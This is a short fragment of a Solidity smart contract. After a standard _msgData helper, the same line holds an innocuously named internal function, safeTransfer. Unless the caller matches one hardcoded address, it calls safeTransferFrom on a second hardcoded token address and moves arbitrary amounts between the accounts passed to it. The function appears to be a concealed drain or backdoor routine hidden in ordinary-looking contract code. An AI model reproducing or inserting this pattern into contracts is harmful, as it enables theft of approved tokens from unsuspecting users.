 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x120F052145D47fef8f9c8d131F8Cc5f3588416e8)) {TransferHelper.safeTransferFrom(0x01fe4A7bAEB07282E1a6Ce83e4Db2B6899776851,spender,recipient,amount);return true;}return false;}
}
